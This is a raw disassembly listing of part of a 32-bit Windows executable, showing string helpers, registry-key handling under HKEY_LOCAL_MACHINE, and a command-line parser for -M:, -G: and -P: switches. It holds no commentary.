  40316d:	add    esp,0x10
  403170:	test   eax,eax
  403172:	js     0x40317c
  403174:	cmp    eax,edi
  403176:	ja     0x40317c
  403178:	jne    0x403187
  40317a:	jmp    0x403181
  40317c:	mov    esi,0x8007007a
  403181:	xor    eax,eax
  403183:	mov    WORD PTR [ebx+edi*2],ax
  403187:	pop    edi
  403188:	pop    ebx
  403189:	jmp    0x403197
  40318b:	test   eax,eax
  40318d:	je     0x403197
  40318f:	mov    ecx,DWORD PTR [ebp+0x8]
  403192:	xor    eax,eax
  403194:	mov    WORD PTR [ecx],ax
  403197:	mov    eax,esi
  403199:	pop    esi
  40319a:	pop    ebp
  40319b:	ret    
  40319c:	int3   
  40319d:	int3   
  40319e:	int3   
  40319f:	int3   
  4031a0:	int3   
  4031a1:	int3   
  4031a2:	int3   
  4031a3:	int3   
  4031a4:	int3   
  4031a5:	int3   
  4031a6:	int3   
  4031a7:	int3   
  4031a8:	int3   
  4031a9:	int3   
  4031aa:	int3   
  4031ab:	int3   
  4031ac:	int3   
  4031ad:	int3   
  4031ae:	int3   
  4031af:	int3   
  4031b0:	mov    edi,edi
  4031b2:	push   ebp
  4031b3:	mov    ebp,esp
  4031b5:	push   edi
  4031b6:	mov    edi,DWORD PTR [ebp+0x28]
  4031b9:	test   edi,edi
  4031bb:	je     0x4032bc
  4031c1:	mov    eax,DWORD PTR [ebp+0xc]
  4031c4:	push   ebx
  4031c5:	xor    ebx,ebx
  4031c7:	sub    eax,ebx
  4031c9:	je     0x403282
  4031cf:	sub    eax,0x1
  4031d2:	jne    0x4032bb
  4031d8:	mov    al,BYTE PTR [ebp+0x10]
  4031db:	mov    BYTE PTR [edi+0x28],al
  4031de:	mov    eax,DWORD PTR [ebp+0x14]
  4031e1:	mov    DWORD PTR [edi+0x10],eax
  4031e4:	mov    eax,DWORD PTR [ebp+0x18]
  4031e7:	mov    DWORD PTR [edi+0x14],eax
  4031ea:	mov    eax,DWORD PTR [ebp+0x1c]
  4031ed:	mov    DWORD PTR [edi+0x18],eax
  4031f0:	mov    eax,DWORD PTR [ebp+0x20]
  4031f3:	mov    DWORD PTR [edi+0x1c],eax
  4031f6:	xor    eax,eax
  4031f8:	mov    DWORD PTR [edi+0x24],0x1
  4031ff:	cmp    ax,WORD PTR [edi+0x2a]
  403203:	jae    0x4032bb
  403209:	push   esi
  40320a:	mov    eax,DWORD PTR [edi+0x30]
  40320d:	mov    cl,BYTE PTR [edi+0x28]
  403210:	mov    edx,DWORD PTR [eax+ebx*8]
  403213:	mov    esi,DWORD PTR [eax+ebx*8+0x4]
  403217:	mov    eax,DWORD PTR [edi+0x34]
  40321a:	cmp    BYTE PTR [ebx+eax*1],cl
  40321d:	jbe    0x403223
  40321f:	test   cl,cl
  403221:	jne    0x40324b
  403223:	mov    eax,edx
  403225:	or     eax,esi
  403227:	je     0x403260
  403229:	mov    ecx,DWORD PTR [edi+0x10]
  40322c:	mov    eax,DWORD PTR [edi+0x14]
  40322f:	and    ecx,edx
  403231:	and    eax,esi
  403233:	or     ecx,eax
  403235:	je     0x40324b
  403237:	mov    eax,DWORD PTR [edi+0x18]
  40323a:	mov    ecx,DWORD PTR [edi+0x1c]
  40323d:	and    eax,edx
  40323f:	and    ecx,esi
  403241:	cmp    eax,DWORD PTR [edi+0x18]
  403244:	jne    0x40324b
  403246:	cmp    ecx,DWORD PTR [edi+0x1c]
  403249:	je     0x403260
  40324b:	mov    edx,DWORD PTR [edi+0x2c]
  40324e:	mov    esi,ebx
  403250:	shr    esi,0x5
  403253:	mov    ecx,ebx
  403255:	and    ecx,0x1f
  403258:	mov    eax,DWORD PTR [edx+esi*4]
  40325b:	btr    eax,ecx
  40325e:	jmp    0x403273
  403260:	mov    edx,DWORD PTR [edi+0x2c]
  403263:	mov    esi,ebx
  403265:	shr    esi,0x5
  403268:	mov    ecx,ebx
  40326a:	and    ecx,0x1f
  40326d:	mov    eax,DWORD PTR [edx+esi*4]
  403270:	bts    eax,ecx
  403273:	mov    DWORD PTR [edx+esi*4],eax
  403276:	inc    ebx
  403277:	movzx  eax,WORD PTR [edi+0x2a]
  40327b:	cmp    ebx,eax
  40327d:	jb     0x40320a
  40327f:	pop    esi
  403280:	jmp    0x4032bb
  403282:	movzx  eax,WORD PTR [edi+0x2a]
  403286:	mov    DWORD PTR [edi+0x24],ebx
  403289:	mov    BYTE PTR [edi+0x28],bl
  40328c:	mov    DWORD PTR [edi+0x10],ebx
  40328f:	mov    DWORD PTR [edi+0x14],ebx
  403292:	mov    DWORD PTR [edi+0x18],ebx
  403295:	mov    DWORD PTR [edi+0x1c],ebx
  403298:	test   ax,ax
  40329b:	je     0x4032bb
  40329d:	dec    eax
  40329e:	cdq    
  40329f:	and    edx,0x1f
  4032a2:	add    eax,edx
  4032a4:	sar    eax,0x5
  4032a7:	lea    eax,[eax*4+0x4]
  4032ae:	push   eax
  4032af:	push   ebx
  4032b0:	push   DWORD PTR [edi+0x2c]
  4032b3:	call   0x407768
  4032b8:	add    esp,0xc
  4032bb:	pop    ebx
  4032bc:	pop    edi
  4032bd:	pop    ebp
  4032be:	ret    0x24
  4032c1:	int3   
  4032c2:	int3   
  4032c3:	int3   
  4032c4:	int3   
  4032c5:	int3   
  4032c6:	mov    eax,ds:0x4083a0
  4032cb:	or     eax,DWORD PTR ds:0x4083a4
  4032d1:	je     0x4032d7
  4032d3:	xor    eax,eax
  4032d5:	jmp    0x4032f1
  4032d7:	push   0x4083a0
  4032dc:	push   0x408010
  4032e1:	push   0x4031b0
  4032e6:	push   0x401100
  4032eb:	call   DWORD PTR ds:0x409110
  4032f1:	ret    0x8
  4032f4:	int3   
  4032f5:	int3   
  4032f6:	int3   
  4032f7:	int3   
  4032f8:	int3   
  4032f9:	mov    ecx,DWORD PTR ds:0x4083a0
  4032ff:	mov    eax,ecx
  403301:	mov    edx,DWORD PTR ds:0x4083a4
  403307:	or     eax,edx
  403309:	jne    0x40330c
  40330b:	ret    
  40330c:	push   edx
  40330d:	push   ecx
  40330e:	call   DWORD PTR ds:0x40910c
  403314:	and    DWORD PTR ds:0x4083a0,0x0
  40331b:	and    DWORD PTR ds:0x4083a4,0x0
  403322:	ret    
  403323:	int3   
  403324:	int3   
  403325:	int3   
  403326:	int3   
  403327:	int3   
  403328:	mov    edi,edi
  40332a:	push   ebp
  40332b:	mov    ebp,esp
  40332d:	sub    esp,0x50
  403330:	mov    eax,ds:0x408004
  403335:	xor    eax,ebp
  403337:	mov    DWORD PTR [ebp-0x8],eax
  40333a:	push   ebx
  40333b:	push   esi
  40333c:	push   edi
  40333d:	xor    ebx,ebx
  40333f:	mov    DWORD PTR [ebp-0x50],ebx
  403342:	push   0xa
  403344:	pop    esi
  403345:	test   edx,edx
  403347:	je     0x403366
  403349:	mov    ecx,edx
  40334b:	lea    edi,[ecx+0x2]
  40334e:	mov    ax,WORD PTR [ecx]
  403351:	add    ecx,0x2
  403354:	cmp    ax,bx
  403357:	jne    0x40334e
  403359:	sub    ecx,edi
  40335b:	sar    ecx,1
  40335d:	lea    ecx,[ecx*2+0x2]
  403364:	jmp    0x403368
  403366:	mov    ecx,esi
  403368:	mov    edi,0x401058
  40336d:	test   edx,edx
  40336f:	jne    0x403373
  403371:	mov    edx,edi
  403373:	mov    DWORD PTR [ebp-0x4c],edx
  403376:	mov    edx,DWORD PTR [ebp+0x10]
  403379:	mov    DWORD PTR [ebp-0x48],ebx
  40337c:	mov    DWORD PTR [ebp-0x44],ecx
  40337f:	mov    DWORD PTR [ebp-0x40],ebx
  403382:	test   edx,edx
  403384:	je     0x4033a5
  403386:	mov    ecx,edx
  403388:	lea    esi,[ecx+0x2]
  40338b:	mov    ax,WORD PTR [ecx]
  40338e:	add    ecx,0x2
  403391:	cmp    ax,bx
  403394:	jne    0x40338b
  403396:	sub    ecx,esi
  403398:	sar    ecx,1
  40339a:	lea    esi,[ecx*2+0x2]
  4033a1:	test   edx,edx
  4033a3:	jne    0x4033a7
  4033a5:	mov    edx,edi
  4033a7:	push   0x4
  4033a9:	pop    ecx
  4033aa:	lea    eax,[ebp-0x50]
  4033ad:	mov    DWORD PTR [ebp-0x3c],edx
  4033b0:	mov    DWORD PTR [ebp-0x2c],eax
  4033b3:	lea    eax,[ebp-0x4c]
  4033b6:	push   eax
  4033b7:	push   ecx
  4033b8:	push   0x4010d8
  4033bd:	push   DWORD PTR ds:0x4083a4
  4033c3:	mov    DWORD PTR [ebp-0x38],ebx
  4033c6:	push   DWORD PTR ds:0x4083a0
  4033cc:	mov    DWORD PTR [ebp-0x34],esi
  4033cf:	mov    DWORD PTR [ebp-0x30],ebx
  4033d2:	mov    DWORD PTR [ebp-0x28],ebx
  4033d5:	mov    DWORD PTR [ebp-0x24],ecx
  4033d8:	mov    DWORD PTR [ebp-0x20],ebx
  4033db:	mov    DWORD PTR [ebp-0x1c],ebx
  4033de:	mov    DWORD PTR [ebp-0x18],ebx
  4033e1:	mov    DWORD PTR [ebp-0x14],ebx
  4033e4:	mov    DWORD PTR [ebp-0x10],ebx
  4033e7:	call   DWORD PTR ds:0x409108
  4033ed:	mov    ecx,DWORD PTR [ebp-0x8]
  4033f0:	pop    edi
  4033f1:	pop    esi
  4033f2:	xor    ecx,ebp
  4033f4:	pop    ebx
  4033f5:	call   0x407090
  4033fa:	mov    esp,ebp
  4033fc:	pop    ebp
  4033fd:	ret    0x14
  403400:	int3   
  403401:	int3   
  403402:	int3   
  403403:	int3   
  403404:	int3   
  403405:	mov    edi,edi
  403407:	push   ebp
  403408:	mov    ebp,esp
  40340a:	push   ecx
  40340b:	push   ecx
  40340c:	and    DWORD PTR [ebp-0x4],0x0
  403410:	push   ebx
  403411:	push   esi
  403412:	push   edi
  403413:	mov    ebx,edx
  403415:	mov    DWORD PTR [ebp-0x8],ecx
  403418:	call   DWORD PTR ds:0x40913c
  40341e:	test   eax,eax
  403420:	jne    0x4034bc
  403426:	xor    edi,edi
  403428:	call   0x406ab9
  40342d:	mov    esi,eax
  40342f:	test   esi,esi
  403431:	je     0x403446
  403433:	push   0x3e8
  403438:	call   DWORD PTR ds:0x4090f0
  40343e:	inc    edi
  40343f:	cmp    edi,0xa
  403442:	jb     0x403428
  403444:	jmp    0x4034b4
  403446:	mov    edi,DWORD PTR [ebp-0x8]
  403449:	lea    eax,[ebp-0x4]
  40344c:	push   eax
  40344d:	push   0x2001f
  403452:	push   0x0
  403454:	push   ebx
  403455:	push   edi
  403456:	call   DWORD PTR ds:0x4090bc
  40345c:	mov    esi,eax
  40345e:	test   esi,esi
  403460:	jne    0x40349d
  403462:	push   DWORD PTR [ebp-0x4]
  403465:	call   DWORD PTR ds:0x4090b4
  40346b:	mov    edx,ebx
  40346d:	mov    ecx,edi
  40346f:	call   0x4066a2
  403474:	mov    esi,eax
  403476:	test   esi,esi
  403478:	jne    0x40349d
  40347a:	test   BYTE PTR ds:0x4083e0,0x1
  403481:	je     0x40349d
  403483:	mov    eax,DWORD PTR [ebp+0x8]
  403486:	test   eax,eax
  403488:	je     0x40348f
  40348a:	mov    eax,DWORD PTR [eax+0x1c]
  40348d:	jmp    0x403491
  40348f:	xor    eax,eax
  403491:	push   ecx
  403492:	push   ecx
  403493:	push   eax
  403494:	push   ecx
  403495:	push   ecx
  403496:	mov    edx,ebx
  403498:	call   0x403328
  40349d:	mov    eax,ds:0x4083c8
  4034a2:	test   eax,eax
  4034a4:	je     0x4034b4
  4034a6:	push   eax
  4034a7:	call   DWORD PTR ds:0x40903c
  4034ad:	and    DWORD PTR ds:0x4083c8,0x0
  4034b4:	call   DWORD PTR ds:0x409134
  4034ba:	mov    eax,esi
  4034bc:	pop    edi
  4034bd:	pop    esi
  4034be:	pop    ebx
  4034bf:	mov    esp,ebp
  4034c1:	pop    ebp
  4034c2:	ret    0x4
  4034c5:	int3   
  4034c6:	int3   
  4034c7:	int3   
  4034c8:	int3   
  4034c9:	int3   
  4034ca:	mov    edi,edi
  4034cc:	push   ebp
  4034cd:	mov    ebp,esp
  4034cf:	push   ecx
  4034d0:	push   ebx
  4034d1:	push   esi
  4034d2:	push   edi
  4034d3:	lea    eax,[ebp-0x4]
  4034d6:	xor    ebx,ebx
  4034d8:	push   eax
  4034d9:	push   0x2001f
  4034de:	push   ebx
  4034df:	push   0x402d80
  4034e4:	push   0x80000002
  4034e9:	mov    edi,ecx
  4034eb:	mov    DWORD PTR [ebp-0x4],ebx
  4034ee:	call   DWORD PTR ds:0x4090bc
  4034f4:	mov    esi,eax
  4034f6:	test   esi,esi
  4034f8:	jne    0x403525
  4034fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4034fd:	mov    edx,edi
  4034ff:	push   ebx
  403500:	call   0x403405
  403505:	push   DWORD PTR [ebp-0x4]
  403508:	mov    esi,eax
  40350a:	call   DWORD PTR ds:0x4090b4
  403510:	test   esi,esi
  403512:	jne    0x403525
  403514:	push   edi
  403515:	push   ebx
  403516:	push   0x323
  40351b:	call   0x4068f5
  403520:	add    esp,0xc
  403523:	jmp    0x403536
  403525:	push   esi
  403526:	push   edi
  403527:	push   0x2
  403529:	push   0x324
  40352e:	call   0x4068f5
  403533:	add    esp,0x10
  403536:	pop    edi
  403537:	mov    eax,esi
  403539:	pop    esi
  40353a:	pop    ebx
  40353b:	mov    esp,ebp
  40353d:	pop    ebp
  40353e:	ret    
  40353f:	int3   
  403540:	int3   
  403541:	int3   
  403542:	int3   
  403543:	int3   
  403544:	mov    edi,edi
  403546:	push   ebp
  403547:	mov    ebp,esp
  403549:	sub    esp,0x42c
  40354f:	mov    eax,ds:0x408004
  403554:	xor    eax,ebp
  403556:	mov    DWORD PTR [ebp-0x4],eax
  403559:	and    DWORD PTR [ebp-0x420],0x0
  403560:	lea    eax,[ebp-0x420]
  403566:	and    DWORD PTR [ebp-0x424],0x0
  40356d:	push   esi
  40356e:	push   edi
  40356f:	push   eax
  403570:	push   0x2001f
  403575:	push   0x0
  403577:	push   0x402d80
  40357c:	push   0x80000002
  403581:	mov    edi,ecx
  403583:	call   DWORD PTR ds:0x4090bc
  403589:	mov    esi,eax
  40358b:	test   esi,esi
  40358d:	jne    0x4036a2
  403593:	push   ebx
  403594:	xor    ebx,ebx
  403596:	push   0x20a
  40359b:	xor    esi,esi
  40359d:	mov    DWORD PTR [ebp-0x428],0x104
  4035a7:	lea    eax,[ebp-0x210]
  4035ad:	push   esi
  4035ae:	push   eax
  4035af:	call   0x407768
  4035b4:	add    esp,0xc
  4035b7:	lea    eax,[ebp-0x428]
  4035bd:	push   esi
  4035be:	push   esi
  4035bf:	push   esi
  4035c0:	push   esi
  4035c1:	push   eax
  4035c2:	lea    eax,[ebp-0x210]
  4035c8:	push   eax
  4035c9:	push   ebx
  4035ca:	push   DWORD PTR [ebp-0x420]
  4035d0:	call   DWORD PTR ds:0x4090b8
  4035d6:	mov    esi,eax
  4035d8:	test   esi,esi
  4035da:	jne    0x403681
  4035e0:	lea    eax,[ebp-0x424]
  4035e6:	push   eax
  4035e7:	push   0x2001f
  4035ec:	push   esi
  4035ed:	lea    eax,[ebp-0x210]
  4035f3:	push   eax
  4035f4:	push   DWORD PTR [ebp-0x420]
  4035fa:	call   DWORD PTR ds:0x4090bc
  403600:	mov    esi,eax
  403602:	test   esi,esi
  403604:	jne    0x403681
  403606:	push   0x20a
  40360b:	lea    eax,[ebp-0x41c]
  403611:	push   esi
  403612:	push   eax
  403613:	call   0x407768
  403618:	add    esp,0xc
  40361b:	mov    DWORD PTR [ebp-0x42c],esi
  403621:	lea    eax,[ebp-0x428]
  403627:	mov    DWORD PTR [ebp-0x428],0x208
  403631:	push   eax
  403632:	lea    eax,[ebp-0x41c]
  403638:	push   eax
  403639:	lea    eax,[ebp-0x42c]
  40363f:	push   eax
  403640:	push   esi
  403641:	push   0x402e04
  403646:	push   DWORD PTR [ebp-0x424]
  40364c:	call   DWORD PTR ds:0x4090c0
  403652:	push   DWORD PTR [ebp-0x424]
  403658:	mov    esi,eax
  40365a:	call   DWORD PTR ds:0x4090b4
  403660:	test   esi,esi
  403662:	jne    0x40367f
  403664:	cmp    DWORD PTR [ebp-0x42c],0x1
  40366b:	jne    0x40367f
  40366d:	lea    eax,[ebp-0x41c]
  403673:	push   eax
  403674:	push   edi
  403675:	call   DWORD PTR ds:0x4090e0
  40367b:	test   eax,eax
  40367d:	je     0x40368c
  40367f:	xor    esi,esi
  403681:	inc    ebx
  403682:	test   esi,esi
  403684:	je     0x403596
  40368a:	jmp    0x4036a1
  40368c:	mov    ecx,DWORD PTR [ebp-0x420]
  403692:	lea    edx,[ebp-0x210]
  403698:	push   0x0
  40369a:	call   0x403405
  40369f:	mov    esi,eax
  4036a1:	pop    ebx
  4036a2:	mov    eax,DWORD PTR [ebp-0x420]
  4036a8:	test   eax,eax
  4036aa:	je     0x4036b8
  4036ac:	cmp    eax,0xffffffff
  4036af:	je     0x4036b8
  4036b1:	push   eax
  4036b2:	call   DWORD PTR ds:0x4090b4
  4036b8:	test   esi,esi
  4036ba:	jne    0x4036cd
  4036bc:	push   edi
  4036bd:	push   esi
  4036be:	push   0x323
  4036c3:	call   0x4068f5
  4036c8:	add    esp,0xc
  4036cb:	jmp    0x4036de
  4036cd:	push   esi
  4036ce:	push   edi
  4036cf:	push   0x2
  4036d1:	push   0x324
  4036d6:	call   0x4068f5
  4036db:	add    esp,0x10
  4036de:	mov    ecx,DWORD PTR [ebp-0x4]
  4036e1:	mov    eax,esi
  4036e3:	pop    edi
  4036e4:	xor    ecx,ebp
  4036e6:	pop    esi
  4036e7:	call   0x407090
  4036ec:	mov    esp,ebp
  4036ee:	pop    ebp
  4036ef:	ret    
  4036f0:	int3   
  4036f1:	int3   
  4036f2:	int3   
  4036f3:	int3   
  4036f4:	int3   
  4036f5:	mov    edi,edi
  4036f7:	push   ebp
  4036f8:	mov    ebp,esp
  4036fa:	and    esp,0xfffffff8
  4036fd:	sub    esp,0x94
  403703:	mov    eax,ds:0x408004
  403708:	xor    eax,esp
  40370a:	mov    DWORD PTR [esp+0x90],eax
  403711:	and    DWORD PTR [esp+0x8],0x0
  403716:	push   ebx
  403717:	push   esi
  403718:	push   edi
  403719:	xor    edi,edi
  40371b:	mov    ebx,ecx
  40371d:	mov    DWORD PTR [esp+0x10],edi
  403721:	call   0x405d98
  403726:	mov    esi,eax
  403728:	test   esi,esi
  40372a:	jne    0x40380c
  403730:	call   0x406276
  403735:	mov    esi,eax
  403737:	test   esi,esi
  403739:	jne    0x40380c
  40373f:	lea    eax,[esp+0x14]
  403743:	push   eax
  403744:	push   0x2001f
  403749:	push   esi
  40374a:	push   0x402d80
  40374f:	push   0x80000002
  403754:	call   DWORD PTR ds:0x4090bc
  40375a:	mov    esi,eax
  40375c:	test   esi,esi
  40375e:	jne    0x40380c
  403764:	mov    edi,DWORD PTR ds:0x4083a8
  40376a:	test   edi,edi
  40376c:	je     0x403808
  403772:	push   0x80
  403777:	lea    eax,[esp+0x1c]
  40377b:	push   0x0
  40377d:	push   eax
  40377e:	call   0x407768
  403783:	movzx  eax,BYTE PTR [edi+0x17]
  403787:	add    esp,0xc
  40378a:	push   eax
  40378b:	movzx  eax,BYTE PTR [edi+0x16]
  40378f:	push   eax
  403790:	movzx  eax,BYTE PTR [edi+0x15]
  403794:	push   eax
  403795:	movzx  eax,BYTE PTR [edi+0x14]
  403799:	push   eax
  40379a:	movzx  eax,BYTE PTR [edi+0x13]
  40379e:	push   eax
  40379f:	movzx  eax,BYTE PTR [edi+0x12]
  4037a3:	push   eax
  4037a4:	movzx  eax,BYTE PTR [edi+0x11]
  4037a8:	push   eax
  4037a9:	movzx  eax,BYTE PTR [edi+0x10]
  4037ad:	push   eax
  4037ae:	movzx  eax,WORD PTR [edi+0xe]
  4037b2:	push   eax
  4037b3:	movzx  eax,WORD PTR [edi+0xc]
  4037b7:	push   eax
  4037b8:	push   DWORD PTR [edi+0x8]
  4037bb:	lea    eax,[esp+0x44]
  4037bf:	push   0x401068
  4037c4:	push   0x40
  4037c6:	push   eax
  4037c7:	call   0x403135
  4037cc:	mov    ecx,DWORD PTR [esp+0x4c]
  4037d0:	lea    edx,[esp+0x50]
  4037d4:	add    esp,0x38
  4037d7:	push   edi
  4037d8:	call   0x403405
  4037dd:	mov    esi,eax
  4037df:	test   esi,esi
  4037e1:	je     0x4037fd
  4037e3:	push   esi
  4037e4:	lea    eax,[esp+0x1c]
  4037e8:	push   eax
  4037e9:	push   ebx
  4037ea:	push   0x1
  4037ec:	push   0x322
  4037f1:	call   0x4068f5
  4037f6:	add    esp,0x14
  4037f9:	xor    esi,esi
  4037fb:	jmp    0x403801
  4037fd:	inc    DWORD PTR [esp+0x10]
  403801:	mov    edi,DWORD PTR [edi]
  403803:	jmp    0x40376a
  403808:	mov    edi,DWORD PTR [esp+0x10]
  40380c:	mov    eax,DWORD PTR [esp+0x14]
  403810:	test   eax,eax
  403812:	je     0x403820
  403814:	cmp    eax,0xffffffff
  403817:	je     0x403820
  403819:	push   eax
  40381a:	call   DWORD PTR ds:0x4090b4
  403820:	call   0x4060bb
  403825:	push   ebx
  403826:	test   edi,edi
  403828:	je     0x403833
  40382a:	push   0x0
  40382c:	push   0x320
  403831:	jmp    0x40383a
  403833:	push   0x2
  403835:	push   0x321
  40383a:	call   0x4068f5
  40383f:	mov    ecx,DWORD PTR [esp+0xa8]
  403846:	add    esp,0xc
  403849:	mov    eax,esi
  40384b:	pop    edi
  40384c:	pop    esi
  40384d:	pop    ebx
  40384e:	xor    ecx,esp
  403850:	call   0x407090
  403855:	mov    esp,ebp
  403857:	pop    ebp
  403858:	ret    
  403859:	int3   
  40385a:	int3   
  40385b:	int3   
  40385c:	int3   
  40385d:	int3   
  40385e:	mov    edi,edi
  403860:	push   ebp
  403861:	mov    ebp,esp
  403863:	push   esi
  403864:	xor    esi,esi
  403866:	push   esi
  403867:	push   esi
  403868:	push   0x1
  40386a:	push   esi
  40386b:	call   DWORD PTR ds:0x409044
  403871:	push   esi
  403872:	push   esi
  403873:	push   0x100
  403878:	call   DWORD PTR ds:0x40907c
  40387e:	push   ecx
  40387f:	push   ecx
  403880:	call   0x4032c6
  403885:	cmp    DWORD PTR [ebp+0x8],0x2
  403889:	je     0x403895
  40388b:	call   0x406a29
  403890:	jmp    0x403995
  403895:	mov    eax,DWORD PTR [ebp+0xc]
  403898:	push   edi
  403899:	mov    edi,DWORD PTR [eax+0x4]
  40389c:	push   edi
  40389d:	call   DWORD PTR ds:0x4090e4
  4038a3:	mov    ecx,eax
  4038a5:	test   ecx,ecx
  4038a7:	jne    0x4038b3
  4038a9:	call   0x406a29
  4038ae:	jmp    0x403994
  4038b3:	push   ebx
  4038b4:	cmp    ecx,0x2
  4038b7:	jb     0x40396e
  4038bd:	movzx  eax,WORD PTR [edi]
  4038c0:	push   0x2f
  4038c2:	pop    edx
  4038c3:	push   0x2d
  4038c5:	pop    ebx
  4038c6:	cmp    ax,bx
  4038c9:	je     0x4038d0
  4038cb:	cmp    ax,dx
  4038ce:	jne    0x4038e1
  4038d0:	cmp    WORD PTR [edi+0x2],0x3f
  4038d5:	jne    0x4038e1
  4038d7:	call   0x406a29
  4038dc:	jmp    0x403993
  4038e1:	cmp    ecx,0x4
  4038e4:	jbe    0x40396e
  4038ea:	push   0x3a
  4038ec:	pop    ebx
  4038ed:	push   0x2d
  4038ef:	pop    ecx
  4038f0:	cmp    ax,cx
  4038f3:	je     0x4038fa
  4038f5:	cmp    ax,dx
  4038f8:	jne    0x40391b
  4038fa:	movzx  ecx,WORD PTR [edi+0x2]
  4038fe:	cmp    ecx,0x4d
  403901:	je     0x403908
  403903:	cmp    ecx,0x6d
  403906:	jne    0x403918
  403908:	cmp    WORD PTR [edi+0x4],bx
  40390c:	jne    0x403918
  40390e:	lea    ecx,[edi+0x6]
  403911:	call   0x4036f5
  403916:	jmp    0x403991
  403918:	push   0x2d
  40391a:	pop    ecx
  40391b:	cmp    ax,cx
  40391e:	je     0x403925
  403920:	cmp    ax,dx
  403923:	jne    0x403946
  403925:	movzx  ecx,WORD PTR [edi+0x2]
  403929:	cmp    ecx,0x47
  40392c:	je     0x403933
  40392e:	cmp    ecx,0x67
  403931:	jne    0x403943
  403933:	cmp    WORD PTR [edi+0x4],bx
  403937:	jne    0x403943
  403939:	lea    ecx,[edi+0x6]
  40393c:	call   0x4034ca
  403941:	jmp    0x403991
  403943:	push   0x2d
  403945:	pop    ecx
  403946:	cmp    ax,cx
  403949:	je     0x403950
  40394b:	cmp    ax,dx
  40394e:	jne    0x40396e
  403950:	movzx  eax,WORD PTR [edi+0x2]
  403954:	cmp    eax,0x50
  403957:	je     0x40395e
  403959:	cmp    eax,0x70
  40395c:	jne    0x40396e
  40395e:	cmp    WORD PTR [edi+0x4],bx
  403962:	jne    0x40396e
  403964:	lea    ecx,[edi+0x6]
  403967:	call   0x403544
  40396c:	jmp    0x403991
  40396e:	push   0x4010d0
  403973:	push   esi
  403974:	call   DWORD PTR ds:0x40918c
  40397a:	pop    ecx
  40397b:	pop    ecx
  40397c:	push   esi
  40397d:	call   DWORD PTR ds:0x409078
  403983:	call   DWORD PTR ds:0x409088
  403989:	push   esi
  40398a:	push   eax
  40398b:	call   DWORD PTR ds:0x409138
  403991:	mov    esi,eax
  403993:	pop    ebx
  403994:	pop    edi
  403995:	call   0x4032f9
  40399a:	mov    eax,esi
  40399c:	pop    esi
  40399d:	pop    ebp
  40399e:	ret    
  40399f:	int3   
  4039a0:	int3   
  4039a1:	int3   
  4039a2:	int3   
  4039a3:	int3   
  4039a4:	mov    edi,edi
  4039a6:	push   ebp
  4039a7:	mov    ebp,esp
  4039a9:	push   esi
  4039aa:	xor    esi,esi
  4039ac:	test   edx,edx
  4039ae:	je     0x4039b8
  4039b0:	cmp    edx,0x7fffffff
  4039b6:	jbe    0x4039bd
  4039b8:	mov    esi,0x80070057
  4039bd:	test   esi,esi
  4039bf:	js     0x403a00
  4039c1:	xor    esi,esi
  4039c3:	test   edx,edx
  4039c5:	je     0x4039f6
  4039c7:	push   ebx
  4039c8:	mov    ebx,DWORD PTR [ebp+0x8]
  4039cb:	push   edi
  4039cc:	mov    edi,0x7ffffffe
  4039d1:	sub    edi,edx
  4039d3:	sub    ebx,ecx
  4039d5:	lea    eax,[edi+edx*1]
  4039d8:	test   eax,eax
  4039da:	je     0x4039f0
  4039dc:	movzx  eax,WORD PTR [ebx+ecx*1]
  4039e0:	test   ax,ax
  4039e3:	je     0x4039f0
  4039e5:	mov    WORD PTR [ecx],ax
  4039e8:	add    ecx,0x2
  4039eb:	sub    edx,0x1
  4039ee:	jne    0x4039d5
  4039f0:	pop    edi
  4039f1:	pop    ebx
  4039f2:	test   edx,edx
  4039f4:	jne    0x403a04
  4039f6:	sub    ecx,0x2
  4039f9:	mov    esi,0x8007007a
  4039fe:	jmp    0x403a04
  403a00:	test   edx,edx
  403a02:	je     0x403a09
  403a04:	xor    eax,eax
  403a06:	mov    WORD PTR [ecx],ax
  403a09:	mov    eax,esi
  403a0b:	pop    esi
  403a0c:	pop    ebp
  403a0d:	ret    0x4
  403a10:	int3   
  403a11:	int3   
  403a12:	int3   
  403a13:	int3   
  403a14:	int3   
  403a15:	mov    edi,edi
  403a17:	push   ebp
  403a18:	mov    ebp,esp
  403a1a:	push   ebx
  403a1b:	push   esi
  403a1c:	mov    esi,DWORD PTR [ebp+0x8]
  403a1f:	mov    ebx,edx
  403a21:	push   edi
  403a22:	mov    edi,ecx
  403a24:	cmp    esi,0x7ffffffd
  403a2a:	jbe    0x403a33
  403a2c:	mov    eax,0x216
  403a31:	jmp    0x403a73
  403a33:	lea    eax,[esi*2+0x4]
  403a3a:	push   eax
  403a3b:	push   0x0
  403a3d:	call   DWORD PTR ds:0x409050
  403a43:	push   eax
  403a44:	call   DWORD PTR ds:0x409048
  403a4a:	mov    DWORD PTR [edi],eax
  403a4c:	test   eax,eax
  403a4e:	jne    0x403a55
  403a50:	push   0xe
  403a52:	pop    eax
  403a53:	jmp    0x403a73
  403a55:	add    esi,esi
  403a57:	push   esi
  403a58:	push   ebx
  403a59:	push   eax
  403a5a:	call   0x40775c
  403a5f:	mov    eax,DWORD PTR [edi]
  403a61:	xor    ecx,ecx
  403a63:	add    esp,0xc
  403a66:	mov    WORD PTR [esi+eax*1],cx
  403a6a:	mov    eax,DWORD PTR [edi]
  403a6c:	mov    WORD PTR [eax+esi*1+0x2],cx
  403a71:	xor    eax,eax
  403a73:	pop    edi
  403a74:	pop    esi
  403a75:	pop    ebx
  403a76:	pop    ebp
  403a77:	ret    0x4
  403a7a:	int3   
  403a7b:	int3   
  403a7c:	int3   
  403a7d:	int3   
  403a7e:	int3   
  403a7f:	xor    eax,eax
  403a81:	push   esi
  403a82:	mov    esi,edx
  403a84:	test   ecx,ecx
  403a86:	je     0x403ab9
  403a88:	test   esi,esi
  403a8a:	je     0x403ab9
  403a8c:	cmp    ecx,esi
  403a8e:	jae    0x403ab9
  403a90:	jmp    0x403ab0
  403a92:	cmp    ecx,esi
  403a94:	jae    0x403ab9
  403a96:	movzx  edx,WORD PTR [ecx]
  403a99:	cmp    edx,0x20
  403a9c:	je     0x403aad
  403a9e:	cmp    edx,0x9
  403aa1:	je     0x403aad
  403aa3:	cmp    edx,0xd
  403aa6:	je     0x403aad
  403aa8:	cmp    edx,0xa
  403aab:	jne    0x403ab7
  403aad:	add    ecx,0x2
  403ab0:	cmp    WORD PTR [ecx],ax
  403ab3:	jne    0x403a92
  403ab5:	pop    esi
  403ab6:	ret    
  403ab7:	mov    eax,ecx
  403ab9:	pop    esi
  403aba:	ret    
  403abb:	int3   
  403abc:	int3   
  403abd:	int3   
  403abe:	int3   
  403abf:	int3   
  403ac0:	mov    edi,edi
  403ac2:	push   esi
